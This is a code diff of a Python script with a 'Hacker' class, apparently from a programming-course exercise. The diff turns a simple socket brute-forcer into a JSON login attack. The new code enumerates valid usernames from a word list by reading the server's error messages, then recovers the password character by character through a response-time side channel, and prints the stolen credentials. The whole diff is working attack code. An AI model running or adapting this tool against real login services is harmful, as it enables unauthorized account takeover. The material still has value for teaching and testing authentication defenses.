@@ -3,13 +3,22 @@ import argparse
 import itertools
 import socket
 import string
+import json
+from datetime import datetime, timedelta
 
-CHARSET = string.ascii_lowercase + string.digits
+CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase
+
+
+def make_login_dict(username='', password=''):
+    return {
+        "login": username,
+        "password": password
+    }
 
 
 class Hacker:
 
-    def __init__(self, ip_address, port, max_size=10):
+    def __init__(self, ip_address, port, max_size=20):
         self.ip_address = ip_address
         self.port = port
         self.max_size = max_size
@@ -23,42 +32,70 @@ class Hacker:
     def __exit__(self, exc_type, exc_val, exc_tb):
         self.sock.close()
 
-    @staticmethod
-    def _gen_upper_lower_combination(text):
-        for chars in itertools.product(*({char.upper(), char.lower()} for char in text)):
+    def gen_password_brute(self):
+        for chars in itertools.chain(*(itertools.product(CHARSET, repeat=n)
+                                       for n in range(1, self.max_size+1))):
             yield "".join(chars)
 
-    def hack(self, algo='brute'):
-        self.hack_brute_dict('passwords.txt')
+    def get_login(self, login_file):
+        with open(login_file, 'r') as f:
+            for line in f:
+                login_name = line.strip()
+                result = self.check(login_name, password='')
+                if result in {"Exception happened during login", "Wrong password!"}:
+                    return login_name
+        return None
 
-    def hack_brute_dict(self, password_file):
-        with open(password_file, 'r') as f:
-            stop = False
-            for password in f:
-                password = password.strip()
-                for new_password in self._gen_upper_lower_combination(password):
-                    self.sock.send(new_password.encode('utf-8'))
-                    msg = self.sock.recv(1024).decode()
-                    if msg == "Connection success!":
-                        stop = True
-                        print(new_password)
-                        break
-                    if msg == "Too many attempts":
-                        stop = True
-                        break
-                if stop:
-                    break
+    def check(self, username, password):
+        '''return response result from the server using the given username & password'''
+        login_dict = make_login_dict(username, password)
+        self.sock.send(json.dumps(login_dict).encode('utf-8'))
+        resp = json.loads(self.sock.recv(1024).decode('utf-8'))
+        return resp["result"]
 
-    def hack_brute(self):
-        for password in itertools.chain(*(itertools.product(CHARSET, repeat=n) for n in range(1, self.max_size+1))):
-            password = "".join(password)
-            self.sock.send(password.encode('utf8'))
-            msg = self.sock.recv(1024).decode('utf-8')
-            if msg == "Connection success!":
-                print(password)
-                break
-            if msg == "Too many attempts":
-                break
+    def check_time_result(self, username, password):
+        '''return request/response time sending message'''
+        login_dict = make_login_dict(username, password)
+        start = datetime.now()
+        self.sock.send(json.dumps(login_dict).encode('utf-8'))
+        resp = json.loads(self.sock.recv(1024).decode('utf-8'))
+        dt = datetime.now() - start
+        return resp['result'], dt
+
+    def get_max_password(self, username, current_password):
+        max_time = timedelta()
+        max_password = None
+        max_result = None
+        for c in CHARSET:
+            new_password = current_password + c
+            result, dt = self.check_time_result(username, new_password)
+            if result == "Connection success!":
+                return new_password, result
+            if dt > max_time:
+                max_time = dt
+                max_password = new_password
+                max_result = result
+        return max_password, max_result
+
+    def get_password_v2(self, username):
+        current_password = ''
+        while True:
+            max_password, max_result = self.get_max_password(username, current_password)
+            if max_result == "Connection success!":
+                return max_password
+            current_password = max_password
+            if len(max_password) >= self.max_size:
+                return ''
+
+    def hack_json(self, login_file):
+        # search admin name
+        login_name = self.get_login(login_file)
+        # search password
+        password = self.get_password_v2(login_name)
+        print(json.dumps(make_login_dict(login_name, password)))
+
+    def hack(self):
+        self.hack_json('logins.txt')
 
 
 def main():
@@ -69,7 +106,11 @@ def main():
     args = my_parser.parse_args()
 
     with Hacker(ip_address=args.ip_address, port=args.port) as hacker:
-        hacker.hack()
+        try:
+            hacker.hack()
+        except Exception as e:
+            print("Something wrong when calling hack()")
+            print(e)
 
 
 if __name__ == '__main__':
